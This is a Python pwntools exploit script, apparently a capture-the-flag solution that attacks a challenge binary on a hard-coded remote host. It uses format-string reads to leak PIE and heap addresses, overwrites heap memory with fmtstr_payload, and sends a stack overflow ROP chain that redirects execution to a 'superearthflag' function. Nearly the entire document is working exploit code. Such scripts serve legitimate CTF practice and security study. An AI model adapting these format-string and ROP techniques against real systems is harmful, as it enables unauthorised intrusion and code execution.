#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(args.BIN)

gs = '''
b *validate
'''

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("172.105.155.54", 6666)
    else:
        return process(e.path)

# Dynamically leak addresses until offset of PIE address
def find_PIE():
    count = 0
    for i in range(14,30):
        try:
            p = start()
            #
            # Find main
            #
            print(f"Trying index {i}:")
            p.recvuntil(b'>>> \n', timeout=2)
            p.sendline(bytes(f'%{i}$p', 'utf-8'))
            p.recvline()
            line = p.recvline(10)
            print(f"Result: {line}")
            if b"0x5" in line:   # We know its the second one ending in 0x5
                if count == 1:
                    print("LEAK:", line)
                    return i
                    break
                count += 1
            
            p.close()
        except:
            log.warn("Crash")
            p.close()

r = ROP(e)

p = start()
# Buffer = 112, canary = 8, rbp = 8, total 128

# # Defeat PIE by leaking address of main off stack
# offset = find_PIE()

offset = 23
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
leak = int(p.recvline().decode('utf-8').strip(), 16)-34        # This leak is of (main+34), so subtract 34
print("PIE leak: ", hex(leak))
print("PIE base: ", hex(leak - e.sym['main']))

e.address = leak - e.sym['main']

# Now get the address of superearthflag
superearthflag_addr = e.sym['superearthflag']
ret = e.address + r.find_gadget(["ret"])[0]
# Leak heap address
# Since main leak was at rbp+8, we our heap address at rbp-8 will be 2 offsets back
offset = offset-2

# Get leak of heap
p.recvuntil(b'>>> \n')
p.sendline(bytes(f'%{offset}$p', 'utf-8'))
# pause()
p.recvline()
heap = int(p.recvline().decode('utf-8').strip(), 16)
print("Heap leak: ", hex(heap))
heap_payload = fmtstr_payload(6, {heap: ret}, write_size='short')

# Now send heap overwrite
p.recvuntil(b'>>> \n')
p.sendline(heap_payload)
#Looking into deployObjective, we need to unmangle the pointer

p.recvuntil(b'>>> \n')
p.sendline(bytes('⬇ ⬆ ⬇ ⬆', 'utf-8'))
p.recvuntil(b"today?\n")
p.send(p64(0x1337+0x8))
p.recvuntil(b"credentials:\n")
p.send(p64(ret))


p.recvuntil(b'>>> \n')
p.sendline(b'Quit\00')

p.recvline()
p.recvline()

chain =  b'N'*120                   # Enter 'quit'
chain += p64(heap)                  # Validation expects a pointer to the heap
chain += b'N'*8
chain += p64(ret)                   # We got a movaps, so we have to set the return pointer to a ret gadget
chain += p64(superearthflag_addr)              # Overwrite main's return pointer

p.sendline(chain)

p.interactive()
